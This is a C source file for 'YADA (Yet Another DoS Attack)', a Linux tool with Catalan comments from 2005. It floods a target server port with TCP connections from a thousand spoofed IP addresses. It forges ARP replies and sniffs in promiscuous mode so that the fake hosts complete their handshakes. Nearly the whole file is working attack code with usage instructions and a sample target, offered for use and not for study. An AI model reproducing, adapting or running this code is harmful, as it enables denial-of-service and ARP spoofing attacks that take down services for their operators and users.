/*
	YADA (Yet Another DoS Attack)
	[ Ver. 10/02/2005 ]

	YADA és un atac de denegació de servei (DoS). Consisteix en saturar un host
	servidor efectuan conexions TCP massives amb aquest a trabés d'un port. Usa
	adreces IP falses amb les quals du a terme les conexions. L'autenticitat de les
	IPs es fa possible resolent les peticions ARP amb respostes Reply ARP falses.

		Ús << ./yada ip_local màscara host_servidor port >>
		Exemple: ./yada 172.16.0.3 255.255.0.0 web.xarxa.es 80

	Albert Nadal G.'05
	albert.nadal@estudiants.urv.es
*/

#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h> 
#include <arpa/inet.h> 
#include <linux/if.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/if_ether.h> 
#include <netinet/in.h>
#include <time.h>
#include <signal.h>

#define NUM_IP_FALSES 1000
#define NUM_TANDES 10		//quantes més millor
#define TEMPS_ESPERA 10	//milisegons d'espera 1000 -> 1 Segon
#define INTERFICIE "eth0"
#define TIPUS_IP 0x0800
#define TIPUS_ARP 0x0806
#define ETH_HW_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define ETHER_HW_TYPE 1
#define OP_ARP_REPLY 2
#define OP_ARP_REQUEST 1
#define LONG_BARRA 45

struct pseudoHeader
{
   unsigned long saddr, daddr;
   char mbz;
   char ptcl;
   unsigned short tcpl;
};

struct paquet_ethernet_tcp 
{
   struct ethhdr eth;
   struct iphdr ip; 
   struct tcphdr tcp;
   char dades[65500];
} __attribute__((packed));

struct arp_packet
{
   u_char targ_hw_addr[ETH_HW_ADDR_LEN];
   u_char src_hw_addr[ETH_HW_ADDR_LEN];
   u_short frame_type;
   u_short hw_type;
   u_short prot_type;
   u_char hw_addr_size;
   u_char prot_addr_size;
   u_short op;
   u_char sndr_hw_addr[ETH_HW_ADDR_LEN];
   u_char sndr_ip_addr[IP_ADDR_LEN];
   u_char rcpt_hw_addr[ETH_HW_ADDR_LEN];
   u_char rcpt_ip_addr[IP_ADDR_LEN];
   u_char padding[18];
};

struct paquet_ethernet_arp 
{
   struct arp_packet arp;
} __attribute__((packed));

struct paquet_tcp 
{
   struct iphdr ip; 
   struct tcphdr tcp;
};

int tanda, con=0;
void enviar_resposta_arp(char *ip_origen, char *mac_origen, char *ip_desti, char *mac_desti);
void die(char* str);
void get_ip_addr(struct in_addr* in_addr,char* str);
void get_hw_addr(char* buf,char* str);
int crear_socket();
int crear_socket_promiscu(char *d, int protocol);
unsigned long obtenir_IP(char *adr);
long mac_addr_sys ( u_char *addr);
void obtenir_mac(char mac[]);
void enviar_paquet(int sock, struct paquet_tcp *paquet);
void calcular_header_checksums(struct paquet_tcp *paquet);
int num_aleatori(int min, int max);
void obtenir_bytes(int bytes[], char ip[]);
unsigned long generar_ip_aleatoria(char ip_xarxa[], char mascara[]);
void omplir_camps_ip(struct paquet_tcp *paquet, unsigned long ip_origen, unsigned long ip_desti);
void omplir_camps_tcp(struct paquet_tcp *paquet,int port_desti, char syn, char ack, unsigned long seq, unsigned long ack_seq);
void generar_llavor_aleatoritzacio();
char existeix_ip(unsigned long llistat[], unsigned long ip);
void enviar_solicitut_conexio_tcp(int sock, unsigned long ip_origen, unsigned long ip_desti, int port_desti);
void IP_to_ascii(unsigned long n, char adr[]);
void enviar_confirmacio_conexio_tcp(int sock, struct paquet_ethernet_tcp *paquet_eth, unsigned long llistat[]);
char paquet_es_una_acceptacio_conexio_tcp(struct paquet_ethernet_tcp *paquet);
char paquet_es_una_request_arp_valida(struct arp_packet *paquet, unsigned long llistat[]);
void enviar_reply_arp(struct arp_packet *p, char mac[]);
int esnifar_paquets_arp(unsigned long llistat[], char mac[]);
int esnifar_paquets_ip(unsigned long llistat[]);
void generar_ip_falses(unsigned long llistat[], char ip_xarxa[], char mascara[]);
void ordenar_ip_falses(unsigned long llistat[]);
void esperar(int seg);
void processar_parametres_execucio(int argc, char* argv[], char ip_local[], char mask[], unsigned long *ip_desti, int *port_desti);
void tancar_aplicacio(int sock, char host[]);
void aturar_snifers(int pid1, int pid2);
void obtenir_ip_xarxa(char ip_xarxa[], char mask[], char ip_local[]);

void enviar_resposta_arp(char *ip_origen, char *mac_origen, char *ip_desti, char *mac_desti)
{
    struct in_addr src_in_addr,targ_in_addr;
    struct arp_packet pkt;
    struct sockaddr sa;
    int sock;

    sock=socket(AF_INET,SOCK_PACKET,htons(ETH_P_RARP));
    if(sock<0)
    {
        perror("socket");
        exit(1);
    }

    pkt.frame_type = htons(TIPUS_ARP);
    pkt.hw_type = htons(ETHER_HW_TYPE);
    pkt.prot_type = htons(TIPUS_IP);
    pkt.hw_addr_size = ETH_HW_ADDR_LEN;
    pkt.prot_addr_size = IP_ADDR_LEN;
    pkt.op=htons(OP_ARP_REPLY);

    get_hw_addr(pkt.targ_hw_addr,mac_desti);
    get_hw_addr(pkt.rcpt_hw_addr,mac_desti);
    get_hw_addr(pkt.src_hw_addr,mac_origen);
    get_hw_addr(pkt.sndr_hw_addr,mac_origen);

    get_ip_addr(&src_in_addr,ip_origen);
    get_ip_addr(&targ_in_addr,ip_desti);

    memcpy(pkt.sndr_ip_addr,&src_in_addr,IP_ADDR_LEN);
    memcpy(pkt.rcpt_ip_addr,&targ_in_addr,IP_ADDR_LEN);

    bzero(pkt.padding,18);

    strcpy(sa.sa_data,INTERFICIE);
    if(sendto(sock,&pkt,sizeof(pkt),0,&sa,sizeof(sa)) < 0)
    {
        perror("sendto");
        exit(1);
    }
}

void die(char* str)
{
	fprintf(stderr,"%s\n",str);
	exit(1);
}

void get_ip_addr(struct in_addr* in_addr,char* str)
{
    struct hostent *hostp;
    in_addr->s_addr=inet_addr(str);
    if(in_addr->s_addr == -1)
    {
        if( (hostp = gethostbyname(str)))
            bcopy(hostp->h_addr,in_addr,hostp->h_length);
        else
        {
            fprintf(stderr,"send_arp: host desconegut %s\n",str);
            exit(1);
        }
    }
}

void get_hw_addr(char* buf,char* str)
{
    int i;
    char c,val;
    for(i=0;i<ETH_HW_ADDR_LEN;i++)
    {
        if( !(c = tolower(*str++))) die("Adreca invàlida");
        if(isdigit(c)) val = c-'0';
        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
        else die("Adreca invàlida");

        *buf = val << 4;
        if( !(c = tolower(*str++))) die("Adreca invàlida");
        if(isdigit(c)) val = c-'0';
        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
        else die("Adreca invàlida");

        *buf++ |= val;

        if(*str == ':')str++;
    }
}

int crear_socket()
{   
   int sock;
   if((sock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0)
   {
      perror("No s'ha pogut crear el socket RAW");
      exit(1);
   }
   return sock;
}

int crear_socket_promiscu(char *d, int protocol)
{   
	int fd;   
	struct ifreq ifr;   
	int s;   

	fd=socket(AF_INET, SOCK_PACKET, htons(protocol));   
	if(fd < 0)
	{	perror("No es pot obenir el socket SOCK_PACKET");
		exit(0);
    }

	strcpy(ifr.ifr_name, d);
	s=ioctl(fd, SIOCGIFFLAGS, &ifr);

	if(s < 0)
	{	close(fd);
		perror("No es poden obtenir els flags");
		exit(0);
    }

	ifr.ifr_flags |= IFF_PROMISC;
	s=ioctl(fd, SIOCSIFFLAGS, &ifr);
	if(s < 0) perror("No es pot activar el mode promiscu");
	return fd;
}

unsigned long obtenir_IP(char *adr)
{
	struct hostent *host;
	host=gethostbyname(adr);
	if(!host)
	{
		fprintf(stderr, "Error: Host %s desconegut\n", adr);
		exit(1);
	}
	return *(unsigned long *)host->h_addr;
}

unsigned short ip_sum (addr, len)
u_short *addr;
int len;
{
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer = 0;

	while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
    {
        *(u_char *) (&answer) = *(u_char *) w;
        sum += answer;
    }

	sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
	sum += (sum >> 16);                 /* add carry */
	answer = ~sum;                      /* truncate to 16 bits */
	return (answer);
}

long mac_addr_sys ( u_char *addr)
{
    struct ifreq ifr;
    struct ifreq *IFR;
    struct ifconf ifc;
    char buf[1024];
    int s, i, ok = 0;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s==-1) return -1;

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    ioctl(s, SIOCGIFCONF, &ifc);

    IFR = ifc.ifc_req;
    for (i = ifc.ifc_len / sizeof(struct ifreq); --i >= 0; IFR++)
    {
        strcpy(ifr.ifr_name, IFR->ifr_name);
        if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0)
        {
            if (! (ifr.ifr_flags & IFF_LOOPBACK))
            {
                if (ioctl(s, SIOCGIFHWADDR, &ifr) == 0)
                {
                    ok = 1;
                    break;
                }
            }
        }
    }
    close(s);
    if(ok) bcopy( ifr.ifr_hwaddr.sa_data, addr, 6);
    else return -1;
    return 0;
}

void obtenir_mac(char mac[])
{
    u_char addr[6];

    if (!mac_addr_sys( addr)) sprintf(mac, "%2.2x:%2.2x:%2.2x:%2.2x:%2.2x:%2.2x", addr[0],addr[1],addr[2],addr[3],addr[4],addr[5]);
    else
    {
        printf("Error: No s'ha pogut obtenir l'adreça MAC de l'equip.\n");
        exit(1);
    }
}

void enviar_paquet(int sock, struct paquet_tcp *paquet)
{
	char buf[65536];
	struct sockaddr_in sin;
	memcpy(buf, &(paquet->ip), 4*(paquet->ip.ihl));
	memcpy(buf+4*(paquet->ip.ihl), &(paquet->tcp), sizeof(struct tcphdr));
	memset(buf+4*(paquet->ip.ihl)+sizeof(struct tcphdr), 0, 4);
	sin.sin_family=AF_INET;
	sin.sin_port=paquet->tcp.dest;
	sin.sin_addr.s_addr=paquet->ip.daddr;

	if(sendto(sock, buf, 4*(paquet->ip.ihl) + sizeof(struct tcphdr), 0, &sin, sizeof(sin))<0)
	{
		printf("Error: No es poden enviar els paquets.\n");
		exit(1);
	}
}

void calcular_header_checksums(struct paquet_tcp *paquet)
{
	char buf[65536];
	struct pseudoHeader ph;

	ph.saddr=paquet->ip.saddr;
	ph.daddr=paquet->ip.daddr;
	ph.mbz=0;
	ph.ptcl=6; //TCP -> 6;
	ph.tcpl=htons(sizeof(paquet->tcp));

	memcpy(buf, &ph, sizeof(ph));
	memcpy(buf+sizeof(ph), &(paquet->tcp), sizeof(paquet->tcp));
	memset(buf+sizeof(ph)+sizeof(paquet->tcp), 0, 4);
	paquet->tcp.check=ip_sum(&buf, (sizeof(ph)+sizeof(paquet->tcp)+ 1)& ~1);

	memcpy(buf, &(paquet->ip), 4*(paquet->ip.ihl));
	memcpy(buf+4*(paquet->ip.ihl), &(paquet->tcp), sizeof(struct tcphdr));
	memset(buf+4*(paquet->ip.ihl)+sizeof(struct tcphdr), 0, 4);
	paquet->ip.check=ip_sum(&buf, (4*(paquet->ip.ihl)+sizeof(struct tcphdr)+ 1) & ~1);
}

int num_aleatori(int min, int max)
{
	int dif=max-min;
	return (rand() % dif) + min;
}

void obtenir_bytes(int bytes[], char ip[])
{
	int e, d, i, l;
	char num[4];
	d=i=0;
	l=strlen(ip);
	while(i<l)
	{
		for(e=0; e<3; e++) num[e]=0;
		e=0;
		while((ip[i]!='.')&&(ip[i]!='\0'))
		{
			num[e]=ip[i];
			i++;
			e++;
		}
		num[e]='\0';
		bytes[d]=atoi(num);
		d++;
		i++;
	}
}

unsigned long generar_ip_aleatoria(char ip_xarxa[], char mascara[])
{
	char ip[16];
	int i, bytes_mascara[4], bytes_ip_xarxa[4], bytes_ip[4];
	obtenir_bytes(bytes_mascara, mascara);
	obtenir_bytes(bytes_ip_xarxa, ip_xarxa);

	for(i=0; i<4; i++)
	{
		if(bytes_mascara[i]==0) bytes_ip[i]=num_aleatori(0,255);
		else bytes_ip[i]=bytes_ip_xarxa[i];
	}

	sprintf(ip,"%d.%d.%d.%d",bytes_ip[0],bytes_ip[1],bytes_ip[2],bytes_ip[3]);
	return obtenir_IP(ip);
}

void omplir_camps_ip(struct paquet_tcp *paquet, unsigned long ip_origen, unsigned long ip_desti)
{
	paquet->ip.version=4;
	paquet->ip.ihl=5;
	paquet->ip.tos=0;
	paquet->ip.tot_len=sizeof(struct iphdr)+sizeof(struct tcphdr);
	paquet->ip.id=htons(num_aleatori(10000,11000));
	paquet->ip.frag_off=64;
	paquet->ip.ttl=64;
	paquet->ip.protocol=6; //TCP -> 6
	paquet->ip.check=0;
	paquet->ip.saddr=ip_origen;
	paquet->ip.daddr=ip_desti;
}

void omplir_camps_tcp(struct paquet_tcp *paquet,int port_desti, char syn, char ack, unsigned long seq, unsigned long ack_seq)
{
	paquet->tcp.source=htons(num_aleatori(1100, 10000));
	paquet->tcp.dest=htons(port_desti);	// Port destí a atacar
	paquet->tcp.seq=htonl(seq);
	paquet->tcp.doff=sizeof(struct tcphdr)/4;
	paquet->tcp.ack_seq=htonl(ack_seq);
	paquet->tcp.res1=0;
	paquet->tcp.fin=0;
	paquet->tcp.syn=syn;
	paquet->tcp.rst=0;
	paquet->tcp.psh=0;
	paquet->tcp.ack=ack;
	paquet->tcp.urg=0;
	paquet->tcp.ece=0;
	paquet->tcp.cwr=0;
	paquet->tcp.window=htons(128);
	paquet->tcp.check=0;
	paquet->tcp.urg_ptr=0;
}

void generar_llavor_aleatoritzacio() { srandom(time(0)); }

char existeix_ip(unsigned long llistat[], unsigned long ip)
{
	int it_min, it_max, it;
	it_min=0;
	it_max=NUM_IP_FALSES;
	/* A continuació es fa una cerca dicotòmica amb cost O(n*log(n)) */

	while(it_min<it_max)
	{
		it=(it_min+it_max)/2;
		if(llistat[it]<ip) it_min=it+1;
		else if(llistat[it]>ip) it_max=it-1;
		else it_min=it_max=it;
	}
	if(llistat[it_min]==ip) return 1;
	else return 0;
}

void enviar_solicitut_conexio_tcp(int sock, unsigned long ip_origen, unsigned long ip_desti, int port_desti)
{
	struct paquet_tcp paquet;
	omplir_camps_tcp(&paquet, port_desti,1,0,0,0);
	omplir_camps_ip(&paquet, ip_origen, ip_desti);
	calcular_header_checksums(&paquet);
	enviar_paquet(sock, &paquet);
}

void IP_to_ascii(unsigned long n, char adr[])
{
	struct in_addr ip;
	ip.s_addr = n;
	strcpy(adr, inet_ntoa(ip));
}

void pintar_barra()
{
	int i, e;
	for(i=0;i<LONG_BARRA+25;i++) printf("\b");
	printf("[ "); fflush(stdout);
	con++;
	e=(con*LONG_BARRA)/(NUM_IP_FALSES);
	if(con==NUM_IP_FALSES) con=0;
	for(i=0;i<e;i++) printf("#");
	for(i=0;i<LONG_BARRA-e;i++) printf("-");
	printf(" ] tanda %d de %d", tanda+1, NUM_TANDES);
	fflush(stdout);
}

void enviar_confirmacio_conexio_tcp(int sock, struct paquet_ethernet_tcp *paquet_eth, unsigned long llistat[])
{
	struct paquet_tcp paquet;
	char ip_falsa[20];
	char ip_servidor[20];
	if(existeix_ip(llistat, paquet_eth->ip.daddr))
	{
		omplir_camps_tcp(&paquet, ntohs(paquet_eth->tcp.source),0,1,htonl(paquet_eth->tcp.ack_seq),htonl(paquet_eth->tcp.seq)+1);
		omplir_camps_ip(&paquet, paquet_eth->ip.daddr, paquet_eth->ip.saddr);
		calcular_header_checksums(&paquet);
		enviar_paquet(sock, &paquet);
		IP_to_ascii(paquet_eth->ip.daddr, ip_falsa);
		IP_to_ascii(paquet_eth->ip.saddr, ip_servidor);
		pintar_barra();
		//printf("[ TCP: IP falsa %s conectada a %s:%d ]\n", ip_falsa, ip_servidor, ntohs(paquet_eth->tcp.source));
	}
}

char paquet_es_una_acceptacio_conexio_tcp(struct paquet_ethernet_tcp *paquet)
{
	if((paquet->ip.version==4)&&(paquet->ip.protocol==6)&&(paquet->tcp.syn)&&(paquet->tcp.ack)) return 1;
	else return 0;
}

char paquet_es_una_request_arp_valida(struct arp_packet *paquet, unsigned long llistat[])
{
	char ip[20];
	if(ntohs(paquet->op)==OP_ARP_REQUEST)
	{
		sprintf(ip,"%d.%d.%d.%d", paquet->rcpt_ip_addr[0],paquet->rcpt_ip_addr[1],paquet->rcpt_ip_addr[2],paquet->rcpt_ip_addr[3]);
		if(existeix_ip(llistat, obtenir_IP(ip))) return 1;
	}
	return 0;
}

void enviar_reply_arp(struct arp_packet *p, char mac[])
{
	char mac_desti[20];
	char ip_desti[20];
	char ip_origen[20];
	sprintf(mac_desti, "%2.2x:%2.2x:%2.2x:%2.2x:%2.2x:%2.2x", (p->sndr_hw_addr[0]), (p->sndr_hw_addr[1]), p->sndr_hw_addr[2], p->sndr_hw_addr[3], p->sndr_hw_addr[4], p->sndr_hw_addr[5]);
	sprintf(ip_desti, "%d.%d.%d.%d", p->sndr_ip_addr[0],p->sndr_ip_addr[1],p->sndr_ip_addr[2],p->sndr_ip_addr[3]);
	sprintf(ip_origen, "%d.%d.%d.%d", p->rcpt_ip_addr[0],p->rcpt_ip_addr[1],p->rcpt_ip_addr[2],p->rcpt_ip_addr[3]);
	//printf("[ REPLY ARP: desde: (%s)(%s) cap a: (%s)(%s) ]\n", ip_origen, mac, ip_desti, mac_desti);
	enviar_resposta_arp(ip_origen, mac, ip_desti, mac_desti);
}

int esnifar_paquets_arp(unsigned long llistat[], char mac[])
{
	int pid;
	if((pid=fork())==0)
	{
		unsigned long *llistat_ip_falses=llistat;
		int sock_promiscu=crear_socket_promiscu(INTERFICIE,TIPUS_ARP);
		struct arp_packet paquet_arp;
		while(1)
		{
			recv(sock_promiscu, (struct arp_packet *)&paquet_arp, sizeof(paquet_arp),0);
			if(paquet_es_una_request_arp_valida(&paquet_arp, llistat_ip_falses)) enviar_reply_arp(&paquet_arp, mac);
		}
	}
	return pid;
}

int esnifar_paquets_ip(unsigned long llistat[])
{
	int pid;
	if((pid=fork())==0)
	{
		unsigned long *llistat_ip_falses=llistat;
		int sock_promiscu=crear_socket_promiscu(INTERFICIE,TIPUS_IP);
		int sock=crear_socket();
		struct paquet_ethernet_tcp paquet_eth;
		while(1)
		{
			recv(sock_promiscu, (struct paquet_ethernet_tcp *)&paquet_eth, sizeof(paquet_eth),0);
			if(paquet_es_una_acceptacio_conexio_tcp(&paquet_eth)) enviar_confirmacio_conexio_tcp(sock, &paquet_eth, llistat_ip_falses);
		}
	}
	return pid;
}

void generar_ip_falses(unsigned long llistat[], char ip_xarxa[], char mascara[])
{
	int i;
	for(i=0; i <NUM_IP_FALSES; i++) llistat[i]=generar_ip_aleatoria(ip_xarxa, mascara);
}

void ordenar_ip_falses(unsigned long llistat[])
{
	int it_a, it_b, it_c; 
	unsigned long min=llistat[0];
	/* A continuació es fa una ordenació seqüencial amb cost O(n*n) */

	for(it_a=0; it_a<NUM_IP_FALSES; it_a++)
	{
		min=llistat[it_a];
		for(it_b=it_a; it_b<NUM_IP_FALSES; it_b++)
		if(llistat[it_b]<=min)
		{
			min=llistat[it_b];
			it_c=it_b;
		}
		llistat[it_c]=llistat[it_a];
		llistat[it_a]=min;
	}
}

void esperar(int seg) { usleep(1000*seg); }

void processar_parametres_execucio(int argc, char* argv[], char ip_local[], char mask[], unsigned long *ip_desti, int *port_desti)
{
	if((argc==2)&&(strcmp(argv[1],"--ajuda")==0))
	{
		printf("YADA és un atac de denegació de servei (DoS). Consisteix en saturar un host\n");
		printf("servidor efectuan conexions TCP massives amb aquest a trabés d'un port. Crea \n");
		printf("adreces IP falses amb les quals du a terme les conexions. L'autenticitat de les\n");
		printf("IP's es fa possible resolent les peticions ARP amb respostes Reply ARP falses.\n\nÚs << %s ip_local màscara host_servidor port >>\n\n",argv[0]);
		printf("Exemple: %s 172.16.0.3 255.255.0.0 web.xarxa.es 80\n\n",argv[0]);
		printf("Obtenir IP local i màscara de la interfície ""%s"": Ús << %s --info >>\n\n",INTERFICIE,argv[0]);
		exit(0);
	}
	if((argc==2)&&(strcmp(argv[1],"--info")==0))
	{
		system("/sbin/ifconfig");
		exit(0);
	}
	else if((argc<=4)||(argc>5))
	{
		printf("%s: nombre incorrecte d'arguments\nProva << %s --ajuda >>\n\n", argv[0],argv[0]);
		exit(0);
	}
	else
	{
		printf("Conexions per tanda: %d\n", NUM_IP_FALSES);
		printf("Nombre de tandes: %d\n", NUM_TANDES);
		printf("Total conexions TCP: %d\n", NUM_IP_FALSES*NUM_TANDES);
		printf("Velocitat: %d intents per segon.\n", 1000/TEMPS_ESPERA);
		printf("Atacant -> %s:%d\n\n",argv[3],atoi(argv[4]));
		strcpy(ip_local, argv[1]);
		strcpy(mask, argv[2]);
		*ip_desti=obtenir_IP(argv[3]);
		*port_desti=atoi(argv[4]);
	}
}

void tancar_aplicacio(int sock, char host[])
{
	close(sock);
	printf("\nL'atac ha finalitzat!\nSi l'atac ha fet efecte, el host %s s'anirà recuperant a partir d'ara.\n", host);
}

void aturar_snifers(int pid1, int pid2)
{
	kill(pid1, SIGKILL);
	kill(pid2, SIGKILL);
}

void obtenir_ip_xarxa(char ip_xarxa[], char mask[], char ip_local[])
{
	int ip1[4], ip2[4];
	obtenir_bytes(ip1, mask);
	obtenir_bytes(ip2, ip_local);
	sprintf(ip_xarxa,"%d.%d.%d.%d",ip1[0]&ip2[0], ip1[1]&ip2[1], ip1[2]&ip2[2], ip1[3]&ip2[3]);
}

int main(int argc, char *argv[])
{
    unsigned long ip_desti, llistat_ip_falses[NUM_IP_FALSES];
    char mac[20], mascara[20], ip_local[20], ip_xarxa[20];
    int n, pid1, pid2, port_desti, sock=crear_socket();

    printf("[ YADA (Yet Another DoS Attack) - Ver. 10/02/2005 ]\n");
    printf("[ Albert Nadal G.'05 ]\n\n");

    processar_parametres_execucio(argc, argv, ip_local, mascara, &ip_desti, &port_desti);
    generar_llavor_aleatoritzacio();
    obtenir_mac(mac);
    obtenir_ip_xarxa(ip_xarxa, mascara, ip_local);

    for(tanda=0; tanda<NUM_TANDES; tanda++)
    {
        generar_ip_falses(llistat_ip_falses, ip_xarxa, mascara);
        ordenar_ip_falses(llistat_ip_falses);
        pid1=esnifar_paquets_ip(llistat_ip_falses);
        pid2=esnifar_paquets_arp(llistat_ip_falses, mac);
        for(n=0; n<NUM_IP_FALSES; n++)
        {
            enviar_solicitut_conexio_tcp(sock, llistat_ip_falses[n], ip_desti, port_desti);
            esperar(TEMPS_ESPERA);
        }

        aturar_snifers(pid1, pid2);
    }

    tancar_aplicacio(sock, argv[1]);
}
